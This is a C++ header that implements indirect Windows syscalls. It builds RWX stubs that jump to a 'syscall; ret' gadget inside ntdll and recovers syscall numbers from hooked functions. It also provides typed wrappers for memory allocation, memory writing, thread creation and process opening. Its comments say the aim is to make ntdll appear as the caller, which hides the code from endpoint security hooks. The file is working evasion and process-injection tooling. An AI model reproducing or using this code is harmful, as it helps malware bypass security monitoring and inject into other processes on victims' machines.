#pragma once
#include <Windows.h>
#include <cstdint>
#include <cstring>

#pragma comment(lib, "ntdll.lib")

// ── NT types ──────────────────────────────────────────────────────────────────
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p,n,a,r,s) \
    (p)->Length=sizeof(OBJECT_ATTRIBUTES);(p)->RootDirectory=r; \
    (p)->Attributes=a;(p)->ObjectName=n;                        \
    (p)->SecurityDescriptor=s;(p)->SecurityQualityOfService=nullptr
#endif

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// ── Indirect syscall implementation — no MASM required ───────────────────────
// Each stub is allocated in RWX memory and contains:
//   mov r10, rcx        (4C 8B D1)
//   mov eax, <ssn>      (B8 xx xx xx xx)
//   jmp QWORD PTR [rip] (FF 25 00 00 00 00)
//   <gadget address>    (8 bytes)
// The jmp jumps to a "syscall; ret" gadget inside the clean ntdll we loaded,
// so the call stack shows ntdll as the caller — not our code.

namespace Syscall {

    // 16 bytes: 3+5+6 = 14, padded to 16 for alignment; gadget ptr follows
#pragma pack(push,1)
    struct StubLayout {
        BYTE  mov_r10_rcx[3];   // 4C 8B D1
        BYTE  mov_eax_ssn[5];   // B8 xx xx xx xx
        BYTE  jmp_rip[6];       // FF 25 00 00 00 00  (jmp [rip+0])
        PVOID gadgetAddr;       // 8 bytes — target of the jmp
    };
#pragma pack(pop)

    inline PVOID g_stubPage    = nullptr;
    inline int   g_stubCount   = 0;
    static constexpr int MAX_STUBS = 16;

    // Individual stub pointers (set by Resolve)
    inline PVOID stub_NtAllocateVirtualMemory = nullptr;
    inline PVOID stub_NtWriteVirtualMemory    = nullptr;
    inline PVOID stub_NtProtectVirtualMemory  = nullptr;
    inline PVOID stub_NtCreateThreadEx        = nullptr;
    inline PVOID stub_NtOpenProcess           = nullptr;
    inline PVOID stub_NtClose                 = nullptr;
    inline PVOID stub_NtQueryVirtualMemory    = nullptr;

    // Find "syscall; ret" (0F 05 C3) in ntdll .text
    inline PVOID FindSyscallGadget(HMODULE ntdll) {
        auto base = reinterpret_cast<PBYTE>(ntdll);
        auto dos  = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        auto nt   = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
        auto sec  = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (memcmp(sec->Name, ".text", 5) != 0) continue;
            auto s = base + sec->VirtualAddress;
            auto e = s + sec->Misc.VirtualSize - 2;
            for (auto p = s; p < e; ++p)
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                    return p;
        }
        return nullptr;
    }

    // Extract SSN — handles hooked (jmp-prefixed) stubs
    inline DWORD ExtractSSN(PVOID addr) {
        auto b = reinterpret_cast<PBYTE>(addr);
        if (b[0] == 0xE9) // jmp rel32 hook → follow it
            b = b + 5 + *reinterpret_cast<INT32*>(b + 1);
        if (b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8)
            return *reinterpret_cast<DWORD*>(b + 4);
        if (b[0] == 0xB8)
            return *reinterpret_cast<DWORD*>(b + 1);
        return 0xFFFFFFFF;
    }

    // Build one stub and return its address in the RWX page
    inline PVOID BuildStub(DWORD ssn, PVOID gadget) {
        auto page = reinterpret_cast<StubLayout*>(
            reinterpret_cast<uintptr_t>(g_stubPage)
            + static_cast<uintptr_t>(g_stubCount) * sizeof(StubLayout));
        ++g_stubCount;

        // mov r10, rcx  →  4C 8B D1
        page->mov_r10_rcx[0] = 0x4C;
        page->mov_r10_rcx[1] = 0x8B;
        page->mov_r10_rcx[2] = 0xD1;

        // mov eax, ssn  →  B8 <ssn:4>
        page->mov_eax_ssn[0] = 0xB8;
        memcpy(page->mov_eax_ssn + 1, &ssn, 4);

        // jmp QWORD PTR [rip+0]  →  FF 25 00 00 00 00
        // RIP at that point = &page->gadgetAddr, so offset = 0
        page->jmp_rip[0] = 0xFF;
        page->jmp_rip[1] = 0x25;
        page->jmp_rip[2] = 0x00;
        page->jmp_rip[3] = 0x00;
        page->jmp_rip[4] = 0x00;
        page->jmp_rip[5] = 0x00;

        page->gadgetAddr = gadget;
        return page;
    }

    inline bool Resolve(HMODULE ntdll) {
        // Allocate one RWX page for all stubs
        g_stubPage = VirtualAlloc(nullptr, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!g_stubPage) return false;

        PVOID gadget = FindSyscallGadget(ntdll);
        if (!gadget) return false;

        struct { const char* name; PVOID* slot; } funcs[] = {
            { "NtAllocateVirtualMemory", &stub_NtAllocateVirtualMemory },
            { "NtWriteVirtualMemory",    &stub_NtWriteVirtualMemory    },
            { "NtProtectVirtualMemory",  &stub_NtProtectVirtualMemory  },
            { "NtCreateThreadEx",        &stub_NtCreateThreadEx        },
            { "NtOpenProcess",           &stub_NtOpenProcess           },
            { "NtClose",                 &stub_NtClose                 },
            { "NtQueryVirtualMemory",    &stub_NtQueryVirtualMemory    },
        };

        for (auto& f : funcs) {
            FARPROC addr = GetProcAddress(ntdll, f.name);
            if (!addr) return false;
            DWORD ssn = ExtractSSN(reinterpret_cast<PVOID>(addr));
            if (ssn == 0xFFFFFFFF) return false;
            *f.slot = BuildStub(ssn, gadget);
        }

        // Make page execute-only after writing stubs
        DWORD old = 0;
        VirtualProtect(g_stubPage, 0x1000, PAGE_EXECUTE_READ, &old);
        return true;
    }

} // namespace Syscall

// ── Typed call-through helpers ────────────────────────────────────────────────
// These replace the extern "C" ASM declarations.
// Each one casts the stub pointer to the correct NT function signature.

inline NTSTATUS IndirectNtAllocateVirtualMemory(
    HANDLE Process, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocType, ULONG Protect)
{
    using Fn = NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return reinterpret_cast<Fn>(Syscall::stub_NtAllocateVirtualMemory)
        (Process, BaseAddress, ZeroBits, RegionSize, AllocType, Protect);
}

inline NTSTATUS IndirectNtWriteVirtualMemory(
    HANDLE Process, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytes, PSIZE_T Written)
{
    using Fn = NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(Syscall::stub_NtWriteVirtualMemory)
        (Process, BaseAddress, Buffer, NumberOfBytes, Written);
}

inline NTSTATUS IndirectNtProtectVirtualMemory(
    HANDLE Process, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect)
{
    using Fn = NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return reinterpret_cast<Fn>(Syscall::stub_NtProtectVirtualMemory)
        (Process, BaseAddress, RegionSize, NewProtect, OldProtect);
}

inline NTSTATUS IndirectNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    using Fn = NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    return reinterpret_cast<Fn>(Syscall::stub_NtCreateThreadEx)
        (ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
         StartRoutine, Argument, CreateFlags, ZeroBits,
         StackSize, MaximumStackSize, AttributeList);
}

inline NTSTATUS IndirectNtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
    using Fn = NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    return reinterpret_cast<Fn>(Syscall::stub_NtOpenProcess)
        (ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

inline NTSTATUS IndirectNtClose(HANDLE Handle)
{
    using Fn = NTSTATUS(*)(HANDLE);
    return reinterpret_cast<Fn>(Syscall::stub_NtClose)(Handle);
}

inline NTSTATUS IndirectNtQueryVirtualMemory(
    HANDLE Process, PVOID BaseAddress, ULONG InfoClass,
    PVOID Buffer, SIZE_T Length, PSIZE_T ResultLength)
{
    using Fn = NTSTATUS(*)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    return reinterpret_cast<Fn>(Syscall::stub_NtQueryVirtualMemory)
        (Process, BaseAddress, InfoClass, Buffer, Length, ResultLength);
}